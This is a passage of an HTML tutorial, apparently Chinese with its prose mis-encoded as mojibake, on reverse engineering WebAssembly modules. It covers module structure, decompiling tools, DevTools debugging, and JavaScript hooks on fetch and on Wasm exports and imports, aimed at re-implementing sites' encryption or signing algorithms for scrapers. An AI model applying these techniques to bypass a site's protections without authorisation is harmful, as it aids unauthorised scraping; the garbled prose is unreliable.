        <li>æ²™ç®±æ‰§è¡Œç¯å¢ƒ</li>
        <li>ä¸ JavaScript äº’æ“ä½œ</li>
      </ul>

      <h3 id="æ ¸å¿ƒåŸç†">æ ¸å¿ƒåŸç†</h3>

      <h4 id="1-æ¨¡å—ç»“æ„">1. æ¨¡å—ç»“æ„</h4>

      <p>WebAssembly æ¨¡å—ç”±å¤šä¸ªéƒ¨åˆ†ç»„æˆï¼š</p>

      <pre><code>graph TD
    subgraph Wasm["WebAssembly æ¨¡å—ç»“æ„"]
        Header[Magic Number&lt;br/&gt;0x00 0x61 0x73 0x6d&lt;br/&gt;Version: 0x01 0x00 0x00 0x00]

        Type[Type Section&lt;br/&gt;ç±»å‹å®šä¹‰&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ å‡½æ•°ç­¾å&lt;br/&gt;â€¢ å‚æ•°ç±»å‹&lt;br/&gt;â€¢ è¿”å›å€¼ç±»å‹]

        Import[Import Section&lt;br/&gt;å¯¼å…¥å£°æ˜&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ å¯¼å…¥å‡½æ•°&lt;br/&gt;â€¢ å¯¼å…¥å†…å­˜&lt;br/&gt;â€¢ å¯¼å…¥è¡¨&lt;br/&gt;â€¢ å¯¼å…¥å…¨å±€å˜é‡]

        Function[Function Section&lt;br/&gt;å‡½æ•°ç­¾åç´¢å¼•&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;å¼•ç”¨ Type Section]

        Table[Table Section&lt;br/&gt;é—´æ¥å‡½æ•°è¡¨&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ å‡½æ•°æŒ‡é’ˆ&lt;br/&gt;â€¢ è¡¨å¤§å°]

        Memory[Memory Section&lt;br/&gt;çº¿æ€§å†…å­˜&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ åˆå§‹é¡µæ•°&lt;br/&gt;â€¢ æœ€å¤§é¡µæ•°&lt;br/&gt;â€¢ é¡µå¤§å°: 64KB]

        Global[Global Section&lt;br/&gt;å…¨å±€å˜é‡&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ ç±»å‹&lt;br/&gt;â€¢ åˆå§‹å€¼&lt;br/&gt;â€¢ å¯å˜æ€§]

        Export[Export Section&lt;br/&gt;å¯¼å‡ºå£°æ˜&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ å¯¼å‡ºå‡½æ•°&lt;br/&gt;â€¢ å¯¼å‡ºå†…å­˜&lt;br/&gt;â€¢ å¯¼å‡ºè¡¨&lt;br/&gt;â€¢ å¯¼å‡ºå…¨å±€å˜é‡]

        Start[Start Section&lt;br/&gt;å¯åŠ¨å‡½æ•°&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;æ¨¡å—å®ä¾‹åŒ–æ—¶è°ƒç”¨]

        Element[Element Section&lt;br/&gt;è¡¨åˆå§‹åŒ–&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;åˆå§‹åŒ–å‡½æ•°è¡¨]

        Code[Code Section&lt;br/&gt;å‡½æ•°ä½“&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ å±€éƒ¨å˜é‡&lt;br/&gt;â€¢ æŒ‡ä»¤åºåˆ—]

        Data[Data Section&lt;br/&gt;æ•°æ®æ®µ&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ é™æ€æ•°æ®&lt;br/&gt;â€¢ å­—ç¬¦ä¸²å¸¸é‡]
    end

    Header --&gt; Type
    Type --&gt; Import
    Import --&gt; Function
    Function --&gt; Table
    Table --&gt; Memory
    Memory --&gt; Global
    Global --&gt; Export
    Export --&gt; Start
    Start --&gt; Element
    Element --&gt; Code
    Code --&gt; Data

    style Header fill:#4a90e2
    style Code fill:#f5a623
    style Export fill:#7ed321
    style Memory fill:#bd10e0
</code></pre>

      <h4 id="2-æŒ‡ä»¤é›†æ¶æ„">2. æŒ‡ä»¤é›†æ¶æ„</h4>

      <p>WebAssembly ä½¿ç”¨åŸºäºå †æ ˆçš„æŒ‡ä»¤é›†ï¼š</p>

      <ul>
        <li><strong>æ•°å€¼æ“ä½œ</strong>: <code>i32.add</code>, <code>i64.mul</code>, <code>f32.div</code>,
          <code>f64.sqrt</code></li>
        <li><strong>å†…å­˜æ“ä½œ</strong>: <code>i32.load</code>, <code>i64.store</code>, <code>memory.grow</code></li>
        <li><strong>æ§åˆ¶æµ</strong>: <code>block</code>, <code>loop</code>, <code>if</code>, <code>br</code>,
          <code>call</code></li>
        <li><strong>å˜é‡æ“ä½œ</strong>: <code>local.get</code>, <code>local.set</code>, <code>global.get</code></li>
      </ul>

      <h4 id="3-ä¸-javascript-äº¤äº’">3. ä¸ JavaScript äº¤äº’</h4>

      <pre><code>sequenceDiagram
    participant JS as JavaScript
    participant Browser as æµè§ˆå™¨
    participant Wasm as WebAssembly&lt;br/&gt;å®ä¾‹

    Note over JS,Wasm: é˜¶æ®µ 1: åŠ è½½ä¸ç¼–è¯‘

    JS-&gt;&gt;Browser: fetch('module.wasm')
    Browser--&gt;&gt;JS: ArrayBuffer

    JS-&gt;&gt;Browser: WebAssembly.compile(buffer)
    Note over Browser: éªŒè¯ Wasm å­—èŠ‚ç &lt;br/&gt;ç¼–è¯‘ä¸ºæœºå™¨ç 

    Browser--&gt;&gt;JS: WebAssembly.Module

    Note over JS,Wasm: é˜¶æ®µ 2: å®ä¾‹åŒ–

    JS-&gt;&gt;Browser: WebAssembly.instantiate(module, imports)
    Note over Browser: åˆ›å»º Wasm å®ä¾‹&lt;br/&gt;åˆå§‹åŒ–å†…å­˜&lt;br/&gt;æ‰§è¡Œ start å‡½æ•°

    Browser-&gt;&gt;Wasm: åˆå§‹åŒ–
    Wasm--&gt;&gt;Browser: Instance

    Browser--&gt;&gt;JS: WebAssembly.Instance

    Note over JS,Wasm: é˜¶æ®µ 3: ç›¸äº’è°ƒç”¨

    JS-&gt;&gt;Wasm: instance.exports.encrypt(data)
    Note over Wasm: æ‰§è¡Œ Wasm å‡½æ•°&lt;br/&gt;å¤„ç†æ•°æ®
    Wasm--&gt;&gt;JS: result

    Note over Wasm: éœ€è¦ JS åŠŸèƒ½
    Wasm-&gt;&gt;JS: imports.console.log(message)
    Note over JS: æ‰§è¡Œ JS å‡½æ•°
    JS--&gt;&gt;Wasm: void

    Note over JS,Wasm: é˜¶æ®µ 4: å†…å­˜å…±äº«

    JS-&gt;&gt;Wasm: instance.exports.memory
    Note over JS: è®¿é—® Wasm çº¿æ€§å†…å­˜&lt;br/&gt;è¯»å†™æ•°æ®
    JS-&gt;&gt;Wasm: new Uint8Array(memory.buffer)
</code></pre>

      <p><strong>ä»£ç ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åŠ è½½ WebAssembly æ¨¡å—</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;module.wasm&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">arrayBuffer</span><span class="p">();</span>

<span class="c1">// å‡†å¤‡å¯¼å…¥å¯¹è±¡ï¼ˆWasm éœ€è¦çš„ JS åŠŸèƒ½ï¼‰</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">imports</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">env</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console_log</span><span class="o">:</span><span class="w"> </span><span class="p">(</span><span class="nx">ptr</span><span class="p">,</span><span class="w"> </span><span class="nx">len</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// ä» Wasm å†…å­˜è¯»å–å­—ç¬¦ä¸²</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">memory</span><span class="p">;</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">memory</span><span class="p">.</span><span class="nx">buffer</span><span class="p">,</span><span class="w"> </span><span class="nx">ptr</span><span class="p">,</span><span class="w"> </span><span class="nx">len</span><span class="p">);</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">TextDecoder</span><span class="p">().</span><span class="nx">decode</span><span class="p">(</span><span class="nx">bytes</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">text</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">};</span>

<span class="c1">// ç¼–è¯‘å¹¶å®ä¾‹åŒ–</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">module</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">compile</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">instance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">instantiate</span><span class="p">(</span><span class="nx">module</span><span class="p">,</span><span class="w"> </span><span class="nx">imports</span><span class="p">);</span>

<span class="c1">// è°ƒç”¨å¯¼å‡ºçš„å‡½æ•°</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">myFunction</span><span class="p">(</span><span class="mf">42</span><span class="p">);</span>

<span class="c1">// è®¿é—®å¯¼å‡ºçš„å†…å­˜</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">memory</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">dataView</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">DataView</span><span class="p">(</span><span class="nx">memory</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="è¯¦ç»†å†…å®¹">è¯¦ç»†å†…å®¹</h2>

      <h3 id="webassembly-é€†å‘å·¥ä½œæµç¨‹">WebAssembly é€†å‘å·¥ä½œæµç¨‹</h3>

      <pre><code>flowchart TD
    Start[å‘ç°ç›®æ ‡ä½¿ç”¨ Wasm] --&gt; Extract[æå– Wasm æ¨¡å—]

    Extract --&gt; Method{é€‰æ‹©åˆ†ææ–¹æ³•}

    Method --&gt;|é™æ€åˆ†æ| Static[é™æ€åˆ†æè·¯å¾„]
    Method --&gt;|åŠ¨æ€åˆ†æ| Dynamic[åŠ¨æ€åˆ†æè·¯å¾„]
    Method --&gt;|æ··åˆåˆ†æ| Hybrid[é™æ€ + åŠ¨æ€]

    subgraph StaticAnalysis["é™æ€åˆ†ææµç¨‹"]
        Static --&gt; Convert[è½¬æ¢æ ¼å¼]
        Convert --&gt; WAT[wasm2wat&lt;br/&gt;ç”Ÿæˆ WAT æ–‡æœ¬]
        Convert --&gt; Decompile[wasm-decompile&lt;br/&gt;ç”Ÿæˆä¼ª C ä»£ç ]
        Convert --&gt; IDA[IDA Pro/Ghidra&lt;br/&gt;åæ±‡ç¼–åˆ†æ]

        WAT --&gt; Identify[è¯†åˆ«å…³é”®å‡½æ•°]
        Decompile --&gt; Identify
        IDA --&gt; Identify

        Identify --&gt; Structure[åˆ†ææ¨¡å—ç»“æ„&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ å¯¼å…¥/å¯¼å‡º&lt;br/&gt;â€¢ å‡½æ•°è°ƒç”¨å…³ç³»&lt;br/&gt;â€¢ æ•°æ®æµåˆ†æ]

        Structure --&gt; Algorithm[è¯†åˆ«ç®—æ³•&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ åŠ å¯†ç®—æ³•&lt;br/&gt;â€¢ ç­¾åç”Ÿæˆ&lt;br/&gt;â€¢ æ•°æ®å¤„ç†]
    end

    subgraph DynamicAnalysis["åŠ¨æ€åˆ†ææµç¨‹"]
        Dynamic --&gt; Hook[Hook æŠ€æœ¯]

        Hook --&gt; HookExport[Hook å¯¼å‡ºå‡½æ•°&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ è®°å½•å‚æ•°&lt;br/&gt;â€¢ è®°å½•è¿”å›å€¼]

        Hook --&gt; HookImport[Hook å¯¼å…¥å‡½æ•°&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ æ‹¦æˆª JS è°ƒç”¨&lt;br/&gt;â€¢ ä¿®æ”¹å‚æ•°]

        Hook --&gt; HookMemory[Hook å†…å­˜è®¿é—®&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ ç›‘æ§è¯»å†™&lt;br/&gt;â€¢ æ•°æ®æµè¿½è¸ª]

        HookExport --&gt; Debug[åŠ¨æ€è°ƒè¯•]
        HookImport --&gt; Debug
        HookMemory --&gt; Debug

        Debug --&gt; DevTools[Chrome DevTools&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ è®¾ç½®æ–­ç‚¹&lt;br/&gt;â€¢ å•æ­¥æ‰§è¡Œ&lt;br/&gt;â€¢ æŸ¥çœ‹å †æ ˆ]

        Debug --&gt; Instrumentation[ä»£ç æ’æ¡©&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ æ³¨å…¥æ—¥å¿—&lt;br/&gt;â€¢ ä¿®æ”¹é€»è¾‘]
    end

    subgraph Replication["å¤ç°ä¸åˆ©ç”¨"]
        Algorithm --&gt; Understand[ç†è§£ç®—æ³•é€»è¾‘]
        DevTools --&gt; Understand
        Instrumentation --&gt; Understand

        Understand --&gt; Replicate{å¤ç°æ–¹å¼}

        Replicate --&gt;|Python/JS| JSImpl[JavaScript/Python&lt;br/&gt;é‡æ–°å®ç°ç®—æ³•]

        Replicate --&gt;|ç›´æ¥è°ƒç”¨| DirectCall[ç›´æ¥è°ƒç”¨ Wasm&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ åŠ è½½æ¨¡å—&lt;br/&gt;â€¢ è°ƒç”¨å‡½æ•°]

        Replicate --&gt;|æå–ä»£ç | Extract2[æå–å…³é”®ä»£ç &lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ ç¼–è¯‘ä¸ºç‹¬ç«‹æ¨¡å—&lt;br/&gt;â€¢ é›†æˆåˆ°å·¥å…·]

        JSImpl --&gt; Verify[éªŒè¯æ­£ç¡®æ€§]
        DirectCall --&gt; Verify
        Extract2 --&gt; Verify
    end

    Verify --&gt; Success{éªŒè¯æˆåŠŸ?}
    Success --&gt;|æ˜¯| Done[å®Œæˆé€†å‘&lt;br/&gt;é›†æˆåˆ°çˆ¬è™«/å·¥å…·]
    Success --&gt;|å¦| Refine[ç»†åŒ–åˆ†æ]
    Refine --&gt; Method

    style Start fill:#4a90e2
    style Done fill:#51cf66
    style Algorithm fill:#f5a623
    style Understand fill:#f5a623
</code></pre>

      <h3 id="ä¸»è¦é€†å‘æ–¹æ³•">ä¸»è¦é€†å‘æ–¹æ³•</h3>

      <h4 id="1-é™æ€åˆ†æ">1. <strong>é™æ€åˆ†æ</strong></h4>

      <h5 id="å·¥å…·é“¾">å·¥å…·é“¾</h5>

      <ul>
        <li>
          <p><strong>wasm2wat</strong>: å°†äºŒè¿›åˆ¶ Wasm è½¬æ¢ä¸ºå¯è¯»çš„ WAT (WebAssembly Text Format)</p>

          <div class="codehilite">
            <pre><span></span><code>wasm2wat<span class="w"> </span>module.wasm<span class="w"> </span>-o<span class="w"> </span>module.wat
</code></pre>
          </div>
        </li>
        <li>
          <p><strong>wasm-objdump</strong>: æŸ¥çœ‹æ¨¡å—ç»“æ„å’Œåæ±‡ç¼–</p>

          <div class="codehilite">
            <pre><span></span><code>wasm-objdump<span class="w"> </span>-x<span class="w"> </span>module.wasm<span class="w">  </span><span class="c1"># æ˜¾ç¤ºæ‰€æœ‰æ®µ</span>
wasm-objdump<span class="w"> </span>-d<span class="w"> </span>module.wasm<span class="w">  </span><span class="c1"># åæ±‡ç¼–</span>
</code></pre>
          </div>
        </li>
        <li>
          <p><strong>wasm-decompile</strong>: å°† Wasm åç¼–è¯‘ä¸ºä¼ª C ä»£ç </p>

          <div class="codehilite">
            <pre><span></span><code>wasm-decompile<span class="w"> </span>module.wasm<span class="w"> </span>-o<span class="w"> </span>output.c
</code></pre>
          </div>
        </li>
        <li>
          <p><strong>IDA Pro / Ghidra</strong>: æ”¯æŒ WebAssembly çš„åæ±‡ç¼–å’Œåç¼–è¯‘</p>

          <ul>
            <li>IDA Pro 7.5+ åŸç”Ÿæ”¯æŒ Wasm</li>
            <li>Ghidra éœ€è¦å®‰è£… Wasm æ’ä»¶</li>
          </ul>
        </li>
      </ul>

      <h5 id="åˆ†ææ­¥éª¤">åˆ†ææ­¥éª¤</h5>

      <ol>
        <li>
          <p><strong>æå– Wasm æ¨¡å—</strong></p>

          <div class="codehilite">
            <pre><span></span><code><span class="c1">// ä»ç½‘é¡µä¸­æ‹¦æˆª Wasm åŠ è½½</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">originalFetch</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">endsWith</span><span class="p">(</span><span class="s1">&#39;.wasm&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">response</span><span class="p">.</span><span class="nx">clone</span><span class="p">().</span><span class="nx">arrayBuffer</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">buffer</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="c1">// ä¿å­˜åˆ°æœ¬åœ°</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">blob</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Blob</span><span class="p">([</span><span class="nx">buffer</span><span class="p">],</span><span class="w"> </span><span class="p">{</span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/wasm&#39;</span><span class="p">});</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">URL</span><span class="p">.</span><span class="nx">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Wasm module:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">);</span>
<span class="w">            </span><span class="p">});</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">;</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">};</span>
</code></pre>
          </div>
        </li>
        <li>
          <p><strong>è¯†åˆ«å¯¼å‡ºå‡½æ•°</strong></p>

          <div class="codehilite">
            <pre><span></span><code>wasm-objdump<span class="w"> </span>-j<span class="w"> </span><span class="nb">export</span><span class="w"> </span>module.wasm
</code></pre>
          </div>
        </li>
        <li>
          <p><strong>åˆ†æå‡½æ•°è°ƒç”¨å…³ç³»</strong></p>

          <ul>
            <li>æŸ¥çœ‹ Import/Export Section</li>
            <li>è¿½è¸ª call æŒ‡ä»¤</li>
            <li>åˆ†æé—´æ¥è°ƒç”¨ (call_indirect)</li>
          </ul>
        </li>
      </ol>

      <h4 id="2-åŠ¨æ€è°ƒè¯•">2. <strong>åŠ¨æ€è°ƒè¯•</strong></h4>

      <h5 id="chrome-devtools">Chrome DevTools</h5>

      <p>Chrome DevTools æ”¯æŒ WebAssembly è°ƒè¯•ï¼š</p>

      <ol>
        <li>åœ¨ Sources é¢æ¿ä¸­å¯ä»¥çœ‹åˆ° Wasm æ¨¡å—</li>
        <li>è®¾ç½®æ–­ç‚¹ï¼ˆæ˜¾ç¤ºä¸º WAT æ ¼å¼ï¼‰</li>
        <li>å•æ­¥æ‰§è¡Œ</li>
        <li>æŸ¥çœ‹å †æ ˆå’Œå˜é‡</li>
      </ol>

      <h5 id="wasmerwasmtime-è°ƒè¯•">Wasmer/Wasmtime è°ƒè¯•</h5>

      <p>ä½¿ç”¨ç‹¬ç«‹è¿è¡Œæ—¶è°ƒè¯•ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ä½¿ç”¨ Wasmtime è¿è¡Œå¹¶è°ƒè¯•</span>
wasmtime<span class="w"> </span>run<span class="w"> </span>--invoke<span class="w"> </span>function_name<span class="w"> </span>module.wasm

<span class="c1"># ä½¿ç”¨ Wasmer</span>
wasmer<span class="w"> </span>run<span class="w"> </span>module.wasm<span class="w"> </span>--invoke<span class="w"> </span>function_name
</code></pre>
      </div>

      <h5 id="å†…å­˜æ£€æŸ¥">å†…å­˜æ£€æŸ¥</h5>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// è®¿é—® Wasm çº¿æ€§å†…å­˜</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">memory</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">memory</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>

<span class="c1">// è¯»å–ç‰¹å®šåœ°å€çš„æ•°æ®</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">dataView</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">DataView</span><span class="p">(</span><span class="nx">memory</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dataView</span><span class="p">.</span><span class="nx">getInt32</span><span class="p">(</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span><span class="w"> </span><span class="c1">// true = little-endian</span>

<span class="c1">// Hook å†…å­˜è®¿é—®</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalMemory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">memory</span><span class="p">;</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;memory&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">get</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Memory accessed&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalMemory</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h4 id="3-hook-æŠ€æœ¯">3. <strong>Hook æŠ€æœ¯</strong></h4>

      <h5 id="hook-å¯¼å‡ºå‡½æ•°">Hook å¯¼å‡ºå‡½æ•°</h5>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Hook Wasm å¯¼å‡ºå‡½æ•°</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalFunc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">;</span>
<span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">encrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;encrypt called with:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalFunc</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;encrypt returned:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="p">};</span>
</code></pre>
      </div>

      <h5 id="hook-å¯¼å…¥å‡½æ•°">Hook å¯¼å…¥å‡½æ•°</h5>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨å®ä¾‹åŒ–æ—¶æä¾› Hook çš„å¯¼å…¥</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">imports</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">env</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// Hook åŸæœ¬ç”± JavaScript æä¾›çš„å‡½æ•°</span>
<span class="w">        </span><span class="nx">console_log</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">ptr</span><span class="p">,</span><span class="w"> </span><span class="nx">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">memory</span><span class="p">;</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">memory</span><span class="p">.</span><span class="nx">buffer</span><span class="p">,</span><span class="w"> </span><span class="nx">ptr</span><span class="p">,</span><span class="w"> </span><span class="nx">len</span><span class="p">);</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">TextDecoder</span><span class="p">().</span><span class="nx">decode</span><span class="p">(</span><span class="nx">bytes</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Wasm Log]:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">str</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">};</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">instance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">instantiate</span><span class="p">(</span><span class="nx">module</span><span class="p">,</span><span class="w"> </span><span class="nx">imports</span><span class="p">);</span>
</code></pre>
      </div>

      <h5 id="frida-hook">Frida Hook</h5>

      <div class="codehilite">
